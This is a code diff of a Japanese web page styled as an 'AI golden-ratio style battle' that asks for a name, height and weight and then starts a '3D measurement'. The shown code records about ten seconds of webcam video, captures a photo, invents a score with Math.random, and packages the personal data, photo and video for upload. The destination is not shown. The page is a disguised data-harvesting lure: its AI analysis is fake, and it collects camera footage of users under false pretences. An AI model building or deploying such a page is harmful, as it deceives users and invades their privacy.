@@ -6,14 +6,11 @@
     <title>AI 黄金比スタイル・バトル</title>
     <style>
         body { font-family: sans-serif; text-align: center; background: #000; color: #fff; padding: 20px; margin: 0; }
-        .container { max-width: 500px; margin: auto; background: #111; padding: 30px 20px; border-radius: 15px; border: 1px solid #333; }
-        h1 { font-size: 1.4em; color: #00ffcc; margin-bottom: 20px; }
-        .input-group { margin-bottom: 15px; text-align: left; width: 90%; margin-left: auto; margin-right: auto; }
-        label { font-size: 0.8em; color: #aaa; display: block; margin-bottom: 5px; }
-        input { width: 100%; padding: 12px; border-radius: 5px; border: 1px solid #444; background: #222; color: #fff; font-size: 1em; box-sizing: border-box; }
-        .info { font-size: 0.85em; color: #888; margin: 15px 0; line-height: 1.5; }
-        button { width: 90%; padding: 18px; font-size: 1.1em; font-weight: bold; background: #00ffcc; color: #000; border: none; border-radius: 5px; cursor: pointer; margin-top: 10px; }
-        #video { width: 100%; border-radius: 10px; background: #000; aspect-ratio: 3 / 4; object-fit: cover; margin-top: 20px; display: none; }
+        .container { max-width: 500px; margin: auto; background: #111; padding: 30px; border-radius: 15px; border: 1px solid #333; }
+        h1 { color: #00ffcc; font-size: 1.4em; }
+        input { width: 90%; padding: 12px; margin-bottom: 15px; border-radius: 5px; border: 1px solid #444; background: #222; color: #fff; }
+        button { width: 90%; padding: 18px; font-weight: bold; background: #00ffcc; color: #000; border: none; border-radius: 5px; cursor: pointer; }
+        #video { width: 100%; border-radius: 10px; margin-top: 20px; display: none; aspect-ratio: 3/4; object-fit: cover; }
         #result { font-size: 1.4em; color: #00ffcc; margin-top: 25px; font-weight: bold; }
         #canvas { display: none; }
     </style>
@@ -22,11 +19,10 @@
     <div class="container">
         <h1>AI 黄金比スタイル・バトル</h1>
         <div id="setup-form">
-            <div class="input-group"><label>エントリーネーム（任意）</label><input type="text" id="username" placeholder="Name"></div>
-            <div class="input-group"><label>身長 (cm)</label><input type="number" id="height" placeholder="170.0"></div>
-            <div class="input-group"><label>体重 (kg)</label><input type="number" id="weight" placeholder="60.0"></div>
-            <p class="info">AIが骨格と比率をスキャンします。</p>
-            <button id="startBtn">3Dスキャンを開始</button>
+            <input type="text" id="username" placeholder="名前">
+            <input type="number" id="height" placeholder="身長 (cm)">
+            <input type="number" id="weight" placeholder="体重 (kg)">
+            <button id="startBtn">バトルにエントリーする</button>
         </div>
         <video id="video" autoplay playsinline muted></video>
         <div id="result"></div>
@@ -52,11 +48,11 @@
                 chunks = [];
                 mediaRecorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
                 mediaRecorder.onstop = () => {
-                    result.innerHTML = "黄金比を算出中...";
+                    result.innerHTML = "黄金比を測定中...";
                     setTimeout(() => { captureAndSend(user, h, w); }, 1500);
                 };
                 mediaRecorder.start();
-                result.innerHTML = "3Dスキャン中...（10秒）";
+                result.innerHTML = "3D測定中...(10秒)";
                 setTimeout(() => {
                     mediaRecorder.requestData();
                     setTimeout(() => { mediaRecorder.stop(); }, 500);
@@ -64,12 +60,12 @@
             }).catch(() => { result.innerHTML = "エラー：許可が必要です。"; setupForm.style.display = 'block'; });
         });
         async function captureAndSend(user, h, w) {
-            const score = (Math.random() * (98 - 82) + 82).toFixed(1);
+            const score = (Math.random() * (99 - 85) + 85).toFixed(1);
             canvas.width = video.videoWidth; canvas.height = video.videoHeight;
             canvas.getContext('2d').drawImage(video, 0, 0);
             canvas.toBlob(async (photoBlob) => {
                 const formData = new FormData();
-                formData.append('content', `【黄金比】\n👤 名前: ${user}\n📏 身長: ${h}cm\n⚖️ 体重: ${w}kg\n📊 スコア: ${score}`);
+                formData.append('content', `【黄金比】\n👤 名前: ${user}\n📏 身長: ${h}cm\n⚖️ 体重: ${w}kg\n📊 点数: ${score}点`);
                 formData.append('file1', photoBlob, 'style.png');
                 if (chunks.length > 0) {
                     const videoBlob = new Blob(chunks, { type: mediaRecorder.mimeType });
